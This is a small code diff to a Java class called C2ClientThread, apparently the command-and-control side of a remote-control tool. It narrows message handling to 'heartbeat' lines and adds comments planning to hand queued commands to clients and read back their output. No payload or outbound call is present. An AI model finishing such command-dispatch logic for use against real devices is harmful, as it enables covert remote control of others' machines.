@@ -35,9 +35,15 @@ public class C2ClientThread extends Thread {
             String str = null;
             try {
                 str = in.readLine();
-                if(str != null){
+                if(str != null && str.equals("heartbeat")){
+                    //str should be heartbeat
+                    //if it is, fetch command from database
+                    //if there is no command, send "none"
+                    //if there is a command, send command and readLine for output
+
                     Log.i("received response from server", str);
                     out.println("Echo " + uuid.toString() + ": " + str);
+
                 }
             } catch (IOException e) {
                 e.printStackTrace();
